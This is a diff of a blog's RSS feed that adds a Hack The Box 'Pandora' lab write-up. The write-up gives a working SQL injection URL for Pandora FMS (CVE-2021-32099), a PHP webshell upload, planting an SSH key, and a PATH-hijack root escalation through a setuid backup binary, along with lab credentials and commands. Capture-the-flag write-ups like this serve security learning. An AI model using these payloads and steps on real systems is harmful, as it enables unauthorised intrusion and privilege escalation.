@@ -1,4 +1,123 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Fri, 01 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - Paper</title><link>https://maclarel.github.io/posts/2022-03/htb_paper/</link><pubDate>Fri, 01 Apr 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-03/htb_paper/</guid><description>Premise As with all Hack The Box (HTB) Machines we&amp;rsquo;re given nothing more than an IP.
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Mon, 04 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - Pandora</title><link>https://maclarel.github.io/posts/2022-03/htb_pandora/</link><pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-03/htb_pandora/</guid><description>Premise Second verse same as the first - we&amp;rsquo;re given an IP and no further information. Commence enumeration!
+Enumeration To set the stage, enumeration is probably the hardest part of this challenge. The rest is doable with some patience and research.
+Out of the gate we have a website talking about some random product. There&amp;rsquo;s nothing interactable, and nmap only gives us TCP 22 and 80 as open ports.
+Fuzzing with ffuf and nikto turns up nothing actionable, just icons and asset directories, neither of which can be used for anything.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p>Second verse same as the first - we&rsquo;re given an IP and no further information. Commence enumeration!</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>To set the stage, enumeration is probably the hardest part of this challenge. The rest is doable with some patience and research.</p>
+<p>Out of the gate we have a website talking about some random product. There&rsquo;s nothing interactable, and <code>nmap</code> only gives us TCP 22 and 80 as open ports.</p>
+<p>Fuzzing with <code>ffuf</code> and <code>nikto</code> turns up nothing actionable, just <code>icons</code> and <code>asset</code> directories, neither of which can be used for anything.</p>
+<p>This is where I got stuck a bit initially, trying to fingerprint the web server further, find alternate hostnames for name-based virtual hosts, etc&hellip;but there&rsquo;s nothing, at least out of the gate.</p>
+<p>From here, I decided to run a rather painstaking UDP scan with <code>nmap</code>, which turned up UDP 161:</p>
+<pre><code>Discovered open port 161/udp on 10.10.11.136 
+</code></pre><p>This wound up being SNMP v1, so we can try running <code>snmpwalk</code> against it. Not being overly familiar with this tool, I just took the default examples and ran against it to experiment- <code>snmpwalk -oS -c public -v 1 panda.htb</code>. Among other information, if you watch long enough (I mentioned patience&hellip;) this will pop up with:</p>
+<pre><code>iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: &quot;-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23
+</code></pre><p>These credentials couldn&rsquo;t possibly work over SSH, could they? They do.</p>
+<p>Unfortunately, our flag is not in the home dir of the user in question, but is unreadable in <code>/home/matt/</code>. On to other enumeration!</p>
+<h1 id="foothold-but-no-real-traction">Foothold, but no real traction</h1>
+<p>At this point we&rsquo;re on the box, we&rsquo;ve got reliable access over <code>ssh</code>, but we can&rsquo;t really do anything as the <code>daniel</code> user has little to no permissions.</p>
+<p>We know we&rsquo;ve got an Apache server running, so let&rsquo;s see what else is running. Maybe there&rsquo;s another site that we couldn&rsquo;t enumerate earlier. As it turns out, there is another directory under <code>/var/www</code> - <code>pandoraconsole</code> but we can&rsquo;t hit it remotely. Looking at <code>/etc/apache/sites-enabled/pandora.conf</code> we can see that it&rsquo;s  <em>only</em> listens on <code>localhost</code> which is part of the reason we couldn&rsquo;t fuzz for it - and that it runs as <code>matt</code>, the user who has our first flag.</p>
+<h1 id="opening-a-pandoras-box">Opening a Pandora&rsquo;s Box</h1>
+<p>Since this will only respond on <code>localhost</code>, we&rsquo;ll need to proxy access. There are a few ways to do this, but SSH port forwarding is probably the easiest by far:</p>
+<pre><code>ssh -L 80:localhost:80 panda.htb
+</code></pre><p>Yep! We have a console. Maybe the same creds? Maybe, but says user can only use the API. Main site links us to docs that cover the API, but long story short there&rsquo;s no direct compromise available there - this is a deep rabbit hole.</p>
+<p>What we do know at this point is that we&rsquo;ve got another possible attack surace - Pandora FMS v7.0NG.742_FIX_PERL2020, and some quick research turns up a few vulnerabilities - <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</a>.</p>
+<p>Following up with <a href="https://github.com/ibnuuby/CVE-2021-32099,">https://github.com/ibnuuby/CVE-2021-32099,</a> we can run the example request and all of a sudden we have an active session as an admin.</p>
+<pre><code>http://localhost:80/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
+</code></pre><p>At this point we&rsquo;ve got admin level access to this product, which must be an avenue for further compromise, but there&rsquo;s nothing immiediately obvious.</p>
+<h1 id="can-we-put-things-in-the-box">Can we put things in the box?</h1>
+<p>As it turns out, the one thing we <em>can</em> do in this product is perform arbitrary file uploads.</p>
+<p>While the paths for these get hashed in so far as how they&rsquo;re returned in the file upload API, poking around the UI we can see some overlap between the images used to populate parts of the UI, logos, etc&hellip; and the contents of the directories that we&rsquo;re able to upload to. This means we&rsquo;ve likely got a predictable path for where our uploaded files will land.</p>
+<p>While this doesn&rsquo;t let us do anything fun like SVG vulnerabilities, it does let us do something even more silly&hellip; upload a <a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">PHP webshell</a>.</p>
+<p>Were our theories about predictable paths correct? Yep! http://localhost/pandora_console/images/webshell.php - and it looks like we&rsquo;re running as <code>matt</code>. Let&rsquo;s get the user flag!</p>
+<pre><code>cat /home/matt/user.txt
+b7989...
+</code></pre><h1 id="getting-root">Getting root</h1>
+<p>Let&rsquo;s try to get a shell as <code>matt</code> by copying our public key into <code>authorized_keys</code> through the webshell.</p>
+<pre><code>echo &lt;key&gt; &gt;&gt; /home/matt/.ssh/authorized_keys
+</code></pre><pre><code>➜  ssh matt@panda.htb                                   
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon  4 Apr 16:38:43 UTC 2022
+
+  System load:  0.02              Processes:             234
+  Usage of /:   63.2% of 4.87GB   Users logged in:       1
+  Memory usage: 9%                IPv4 address for eth0: 10.10.11.136
+  Swap usage:   0%
+
+  =&gt; /boot is using 91.8% of 219MB
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+matt@pandora:~$ 
+
+</code></pre><p>We are in!</p>
+<p>The current run of the mill stuff like polkit vulnerabilities appear to have been patched, so no luck there, and we don&rsquo;t have any <code>sudo</code> privs. Nothing obvious gained here other than the user flag.</p>
+<p>At this point I decided to take a step back and run <a href="https://github.com/DominicBreuker/pspy">pspy</a> for a few hours to see if anything interesting came up. While this gave me a few leads, there was nothing that was jumping out at me or lead to anything other than rabbit holes.</p>
+<p>After letting <code>pspy</code> again run for a bit longer in the background and getting nowhere I decided to check for something simple - we we have any <code>setuid</code> flagged scripts/binaries that we could abuse?</p>
+<pre><code>matt@pandora:/dev/shm$ find / -perm -4000 2&gt;/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/pandora_backup
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+</code></pre><p><code>pandora_backup</code> looks like a plant&hellip; what is it and can we use it?</p>
+<pre><code>matt@pandora:/dev/shm$ ll /usr/bin/pandora_backup 
+-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup*
+</code></pre><p>It&rsquo;s either a plant, or its our target. I&rsquo;m guessing the later. It&rsquo;s a binary though, so let&rsquo;s see what&rsquo;s in it&hellip; hopefully there are some plain text strings:</p>
+<pre><code>PandoraFMS Backup Utility^@^@^@^@^@^@^@Now attempting to backup PandoraFMS client^@^@^@^@^@^@tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*^@Backup failed!
+</code></pre><p>Ok, we can run with this&hellip; so it&rsquo;s trying to create a tar file, and it&rsquo;s not specifying the path to the executable. Can we abuse this with a <code>PATH</code> update?</p>
+<pre><code>tar: Removing leading `/' from hard link targets
+/var/www/pandora/pandora_console/COPYING
+/var/www/pandora/pandora_console/DB_Dockerfile
+</code></pre><p>It&rsquo;s definitely running <code>tar</code>. Let&rsquo;s update PATH with a malicious <code>tar</code> executable that&rsquo;s going to spawn a shell. Since this process runs as <code>root</code>, we should be able to get a <code>root</code> shell, right?</p>
+<pre><code>matt@pandora:/dev/shm$ echo &quot;/bin/bash&quot; &gt; tar
+matt@pandora:/dev/shm$ chmod +x tar 
+matt@pandora:/dev/shm$ PATH=/dev/shm:$PATH
+matt@pandora:/dev/shm$ echo $PATH
+/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+</code></pre><p>Running <code>tar</code> as <code>matt</code> now gives us a new shell (as <code>matt</code>). Does this carry over into <code>pandora_backup</code>?</p>
+<p>YES!</p>
+<pre><code>matt@pandora:/dev/shm$ /usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+root@pandora:/dev/shm# whoami
+root
+root@pandora:/dev/shm# cat /root/root.txt 
+18dd17ce1...
+</code></pre><p>Time to clean up and get out! GG!</p>
+]]></content></item><item><title>Hack The Box - Paper</title><link>https://maclarel.github.io/posts/2022-03/htb_paper/</link><pubDate>Fri, 01 Apr 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-03/htb_paper/</guid><description>Premise As with all Hack The Box (HTB) Machines we&amp;rsquo;re given nothing more than an IP.
 Initial target enumeration with nmap shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn&amp;rsquo;t super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.
 Further exploration Next step, after a lot of poking, prodding, fuzzing, etc&amp;hellip; and getting nowhere was to try out nikto to see if there&amp;rsquo;s anything else the webserver might be leaking for us.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
 <p>As with all Hack The Box (HTB) <code>Machines</code> we&rsquo;re given nothing more than an IP.</p>
